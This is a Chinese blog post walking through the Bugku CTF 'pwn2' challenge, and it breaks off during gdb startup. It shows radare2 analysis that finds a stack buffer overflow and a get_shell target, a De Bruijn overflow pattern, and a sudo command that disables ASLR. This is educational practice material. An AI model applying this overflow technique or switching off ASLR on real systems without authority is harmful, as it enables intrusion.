<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>Bugku Pwn Walkthrough | 漏断&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="前言 学习组原后对pwn的理解能力提升了。跟着wp走一遍，增加对pwn的基本了解，记录一下流程，使用工具主要为radare2和gdb">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="Bugku Pwn Walkthrough">
<meta property="og:url" content="http://houwenda.github.io/2020/03/16/Bugku-Pwn-Walkthrough/index.html">
<meta property="og:site_name" content="漏断&#39;s Blog">
<meta property="og:description" content="前言 学习组原后对pwn的理解能力提升了。跟着wp走一遍，增加对pwn的基本了解，记录一下流程，使用工具主要为radare2和gdb">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2020-03-15T22:31:04.060Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bugku Pwn Walkthrough">
<meta name="twitter:description" content="前言 学习组原后对pwn的理解能力提升了。跟着wp走一遍，增加对pwn的基本了解，记录一下流程，使用工具主要为radare2和gdb">
  
    <link rel="alternative" href="/atom.xml" title="漏断&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/head.jpg">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: false,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/head.jpg" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate">漏断</a></h1>
        </hgroup>

        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">首页</a></li>
                        
                            <li><a href="/archives">文章列表</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=n6impqaorK2rq9-u7rH88PI" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/houwenda" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo" target="_blank" href="#" title="weibo">weibo</a>
                            
                                <a class="fl google" target="_blank" href="#" title="google">google</a>
                            
                                <a class="fl twitter" target="_blank" href="#" title="twitter">twitter</a>
                            
                                <a class="fl linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/BadUSB/" style="font-size: 10px;">BadUSB</a> <a href="/tags/HID攻击/" style="font-size: 10px;">HID攻击</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/Python/" style="font-size: 13.33px;">Python</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/environments/" style="font-size: 16.67px;">environments</a> <a href="/tags/shell/" style="font-size: 13.33px;">shell</a> <a href="/tags/social-engineering/" style="font-size: 10px;">social engineering</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/出题笔记/" style="font-size: 10px;">出题笔记</a> <a href="/tags/学习打卡/" style="font-size: 20px;">学习打卡</a> <a href="/tags/树莓派/" style="font-size: 10px;">树莓派</a> <a href="/tags/格式转换/" style="font-size: 10px;">格式转换</a> <a href="/tags/环境配置/" style="font-size: 13.33px;">环境配置</a> <a href="/tags/踩坑记录/" style="font-size: 10px;">踩坑记录</a> <a href="/tags/速查备忘/" style="font-size: 20px;">速查备忘</a> <a href="/tags/题解/" style="font-size: 13.33px;">题解</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://xlor.cn">XLor</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lordcasser.com/">LordCasser</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">现就读南京理工大学，网络安全爱好者</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">漏断</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">漏断</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">首页</a></li>
                
                    <li><a href="/archives">文章列表</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=n6impqaorK2rq9-u7rH88PI" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/houwenda" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
                    
                        <a class="google" target="_blank" href="#" title="google">google</a>
                    
                        <a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
                    
                        <a class="linkedin" target="_blank" href="#" title="linkedin">linkedin</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-Bugku-Pwn-Walkthrough" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/03/16/Bugku-Pwn-Walkthrough/" class="article-date">
      <time datetime="2020-03-15T22:21:04.000Z" itemprop="datePublished">2020-03-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Bugku Pwn Walkthrough
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/LTF/">LTF</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>学习组原后对pwn的理解能力提升了。跟着wp走一遍，增加对pwn的基本了解，记录一下流程，使用工具主要为radare2和gdb<br><a id="more"></a></p>
</blockquote>
<p>参考链接：<a href="https://blog.csdn.net/kety_gz/article/details/100516666" target="_blank" rel="noopener">https://blog.csdn.net/kety_gz/article/details/100516666</a></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>不涉及pwn，略</p>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>checksec<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">checksec --file=pwn2</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE</span><br><span class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   74 Symbols     No	0		2	pwn2</span><br></pre></td></tr></table></figure></p>
<p>rabin2查看程序信息和字符串<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">rabin2 -I pwn2</span></span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x400000</span><br><span class="line">binsz    6946</span><br><span class="line">bintype  elf</span><br><span class="line">bits     64</span><br><span class="line">canary   false</span><br><span class="line">class    ELF64</span><br><span class="line">compiler GCC: (Ubuntu 5.0-6ubuntu1~16.04.10) 53.0 20160609</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib64/ld-linux-x86-64.so.2</span><br><span class="line">laddr    0x0</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  AMD x86-64 architecture</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       false</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">sanitiz  false</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">rabin2 -z pwn2</span></span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section type  string</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">0   0x00000804 0x00400804 14  15   .rodata ascii say something?</span><br><span class="line">1   0x00000813 0x00400813 20  21   .rodata ascii oh,that's so boring!</span><br><span class="line">2   0x00000828 0x00400828 27  28   .rodata ascii tql~tql~tql~tql~tql~tql~tql</span><br><span class="line">3   0x00000844 0x00400844 18  19   .rodata ascii this is your flag!</span><br><span class="line">4   0x00000857 0x00400857 8   9    .rodata ascii cat flag</span><br></pre></td></tr></table></figure></p>
<p>r2追踪cat flag字符串<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">r2 pwn2</span></span><br><span class="line"> -- Search returned no hits. Did you mean 'Misassemble'?</span><br><span class="line"><span class="meta">[0x004005d0]&gt;</span><span class="bash"> aaa</span></span><br><span class="line">[Cannot analyze at 0x004005c0g with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[Cannot analyze at 0x004005c0ac)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Check for objc references</span><br><span class="line">[x] Check for vtables</span><br><span class="line">[x] Type matching analysis for all functions (aaft)</span><br><span class="line">[x] Propagate noreturn information</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line"><span class="meta">[0x004005d0]&gt;</span><span class="bash"> axt @ 0x00400857</span></span><br><span class="line">sym.get_shell 0x400769 [DATA] mov edi, str.cat_flag</span><br></pre></td></tr></table></figure></p>
<p>r2列出函数并定位sym.get_shell，确定目标为执行get_shell函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[0x004005d0]&gt; afl</span><br><span class="line">0x004005d0    1 41           entry0</span><br><span class="line">0x004005a0    1 6            sym.imp.__libc_start_main</span><br><span class="line">0x00400600    4 50   -&gt; 41   sym.deregister_tm_clones</span><br><span class="line">0x00400640    4 58   -&gt; 55   sym.register_tm_clones</span><br><span class="line">0x00400680    3 28           entry.fini0</span><br><span class="line">0x004006a0    4 38   -&gt; 35   entry.init0</span><br><span class="line">0x004007f0    1 2            sym.__libc_csu_fini</span><br><span class="line">0x004007f4    1 9            sym._fini</span><br><span class="line">0x00400751    1 37           sym.get_shell</span><br><span class="line">0x00400560    1 6            sym.imp.puts</span><br><span class="line">0x00400570    1 6            sym.imp.system</span><br><span class="line">0x00400780    4 101          sym.__libc_csu_init</span><br><span class="line">0x004006c6    1 139          main</span><br><span class="line">0x00400580    1 6            sym.imp.memset</span><br><span class="line">0x004005b0    1 6            sym.imp.setvbuf</span><br><span class="line">0x00400590    1 6            sym.imp.read</span><br><span class="line">0x00400528    3 26           sym._init</span><br></pre></td></tr></table></figure></p>
<p>r2反汇编sym.main函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[0x004005d0]&gt; pdf @ sym.main</span><br><span class="line">┌ 139: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           ; var void *buf @ rbp-0x30</span><br><span class="line">│           ; DATA XREF from entry0 @ 0x4005ed</span><br><span class="line">│           0x004006c6      55             push rbp</span><br><span class="line">│           0x004006c7      4889e5         mov rbp, rsp</span><br><span class="line">│           0x004006ca      4883ec30       sub rsp, 0x30</span><br><span class="line">│           0x004006ce      488d45d0       lea rax, [buf]</span><br><span class="line">│           0x004006d2      ba30000000     mov edx, 0x30               ; <span class="string">'0'</span> ; 48 ; size_t n</span><br><span class="line">│           0x004006d7      be00000000     mov esi, 0                  ; int c</span><br><span class="line">│           0x004006dc      4889c7         mov rdi, rax                ; void *s</span><br><span class="line">│           0x004006df      e89cfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)</span><br><span class="line">│           0x004006e4      488b05750920.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5</span><br><span class="line">│                                                                      ; [0x601060:8]=0</span><br><span class="line">│           0x004006eb      b900000000     mov ecx, 0                  ; size_t size</span><br><span class="line">│           0x004006f0      ba02000000     mov edx, 2                  ; int mode</span><br><span class="line">│           0x004006f5      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x004006fa      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x004006fd      e8aefeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x00400702      488b05670920.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5</span><br><span class="line">│                                                                      ; [0x601070:8]=0</span><br><span class="line">│           0x00400709      b900000000     mov ecx, 0                  ; size_t size</span><br><span class="line">│           0x0040070e      ba01000000     mov edx, 1                  ; int mode</span><br><span class="line">│           0x00400713      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x00400718      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x0040071b      e890feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x00400720      bf04084000     mov edi, str.say_something  ; 0x400804 ; <span class="string">"say something?"</span> ; const char *s</span><br><span class="line">│           0x00400725      e836feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x0040072a      488d45d0       lea rax, [buf]</span><br><span class="line">│           0x0040072e      ba00010000     mov edx, 0x100              ; rdx ; size_t nbyte</span><br><span class="line">│           0x00400733      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│           0x00400736      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x0040073b      e850feffff     call sym.imp.read           ; ssize_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x00400740      bf13084000     mov edi, str.oh_that_s_so_boring ; 0x400813 ; <span class="string">"oh,that's so boring!"</span> ; const char *s</span><br><span class="line">│           0x00400745      e816feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x0040074a      b800000000     mov eax, 0</span><br><span class="line">│           0x0040074f      c9             leave</span><br><span class="line">└           0x00400750      c3             ret</span><br></pre></td></tr></table></figure></p>
<p>read()可造成栈溢出，尝试覆盖rip，自动测试溢出长度<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成De Bruijn序列</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ragg2 -P 200 -r &gt; patt.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash">cat patt.txt </span></span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh</span><br><span class="line"><span class="meta">#</span><span class="bash"> Debug所使用的配置文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash">cat &gt; pwn2.rr2 &lt;&lt;EOF</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="comment">#!/usr/bin/rarun2</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> stdin=./patt.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> EOF</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 暂时关闭ASLR</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> 0 | sudo tee /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始Debug</span></span><br><span class="line"><span class="meta">$</span><span class="bash">r2 -r pwn2.rr2 -d pwn2</span></span><br><span class="line">Process with PID 24375 started...</span><br><span class="line">= attach 24375 24375</span><br><span class="line">bin.baddr 0x00400000</span><br><span class="line">Using 0x400000</span><br><span class="line">asm.bits 64</span><br><span class="line"> -- Move around the bytes with h,j,k,l! Arrow keys are neither portable nor efficient</span><br><span class="line"><span class="meta">[0x7ffff7fd3100]&gt;</span><span class="bash"> dc</span></span><br><span class="line">say something?</span><br><span class="line">oh,that's so boring!</span><br><span class="line">child stopped with signal 11</span><br><span class="line">[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0</span><br><span class="line"><span class="meta">[0x00400750]&gt;</span><span class="bash"> wopO `dr rip`</span></span><br><span class="line">-1</span><br></pre></td></tr></table></figure></p>
<p>发现rip没有被覆盖，查看寄存器和栈<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[0x00400750]&gt; dr</span><br><span class="line">rax = 0x00000000</span><br><span class="line">rbx = 0x00400780</span><br><span class="line">rcx = 0x7ffff7ed0567</span><br><span class="line">rdx = 0x00000000</span><br><span class="line">r8 = 0x00000015</span><br><span class="line">r9 = 0x7ffff7fe2260</span><br><span class="line">r10 = 0x004003cd</span><br><span class="line">r11 = 0x00000246</span><br><span class="line">r12 = 0x004005d0</span><br><span class="line">r13 = 0x7fffffffe250</span><br><span class="line">r14 = 0x00000000</span><br><span class="line">r15 = 0x00000000</span><br><span class="line">rsi = 0x7ffff7fa0583</span><br><span class="line">rdi = 0x7ffff7fa2320</span><br><span class="line">rsp = 0x7fffffffe168</span><br><span class="line">rbp = 0x4153414152414151</span><br><span class="line">rip = 0x00400750</span><br><span class="line">rflags = 0x00010246</span><br><span class="line">orax = 0xffffffffffffffff</span><br><span class="line">[0x00400750]&gt; pxr @ rsp</span><br><span class="line">0x7fffffffe168 0x5641415541415441   ATAAUAAV @rsp ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe170 0x4141584141574141   AAWAAXAA ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe178 0x416141415a414159   YAAZAAaA ascii (<span class="string">'Y'</span>)</span><br><span class="line">0x7fffffffe180 0x6441416341416241   AbAAcAAd ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe188 0x4141664141654141   AAeAAfAA ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe190 0x4169414168414167   gAAhAAiA ascii (<span class="string">'g'</span>)</span><br><span class="line">0x7fffffffe198 0x6c41416b41416a41   AjAAkAAl ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1a0 0x41416e41416d4141   AAmAAnAA ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1a8 0x417141417041416f   oAApAAqA ascii (<span class="string">'o'</span>)</span><br><span class="line">0x7fffffffe1b0 0x7441417341417241   ArAAsAAt ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1b8 0x4141764141754141   AAuAAvAA ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1c0 0x4179414178414177   wAAxAAyA ascii (<span class="string">'w'</span>)</span><br><span class="line">0x7fffffffe1c8 0x3241413141417a41   AzAA1AA2 ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1d0 0x4141344141334141   AA3AA4AA ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1d8 0x4137414136414135   5AA6AA7A ascii (<span class="string">'5'</span>)</span><br><span class="line">0x7fffffffe1e0 0x3041413941413841   A8AA9AA0 ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1e8 0x4241434241424241   ABBABCAB ascii (<span class="string">'A'</span>)</span><br><span class="line">0x7fffffffe1f0 0x4146424145424144   DABEABFA ascii (<span class="string">'D'</span>)</span><br><span class="line">0x7fffffffe1f8 0x00007fffffff0a0a   ........ ([stack]) stack R W X <span class="string">'add byte [rax], al'</span> <span class="string">'[stack]'</span></span><br><span class="line">0x7fffffffe200 0x00007ffff7ffe120    ....... (unk0) R W X <span class="string">'add byte [rax], al'</span> <span class="string">'unk0'</span></span><br><span class="line">0x7fffffffe208 ..[ null bytes ]..   00000000 </span><br><span class="line">0x7fffffffe218 0x00000000004005d0   ..@..... (/home/houwd/Desktop/pwn2) 4195792 (.text) program R X <span class="string">'xor ebp, ebp'</span> <span class="string">'pwn2'</span></span><br><span class="line">0x7fffffffe220 0x00007fffffffe250   P....... ([stack]) stack R W X <span class="string">'add dword [rax], eax'</span> <span class="string">'[stack]'</span></span><br><span class="line">0x7fffffffe228 ..[ null bytes ]..   00000000 </span><br><span class="line">0x7fffffffe238 0x00000000004005f9   ..@..... (/home/houwd/Desktop/pwn2) 4195833 (.text) program R X <span class="string">'hlt'</span> <span class="string">'pwn2'</span></span><br><span class="line">0x7fffffffe240 0x00007fffffffe248   H....... ([stack]) stack R W X <span class="string">'sbb al, 0'</span> <span class="string">'[stack]'</span></span><br><span class="line">0x7fffffffe248 0x000000000000001c   ........ 28 (.comment)</span><br><span class="line">0x7fffffffe250 0x0000000000000001   ........ @r13 1 (.comment)</span><br><span class="line">0x7fffffffe258 0x00007fffffffe539   9....... ([stack]) stack R W X <span class="string">'invalid'</span> <span class="string">'[stack]'</span> (./pwn2)</span><br><span class="line">0x7fffffffe260 ..[ null bytes ]..   00000000</span><br></pre></td></tr></table></figure></p>
<p>栈溢出，但在ret前就发生了segmentation fault，这里无法通过wopO指令自动定位</p>
<p>gdb反汇编<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gdb</span> pwn2</span><br><span class="line">GNU gdb (GDB) 9.1</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later 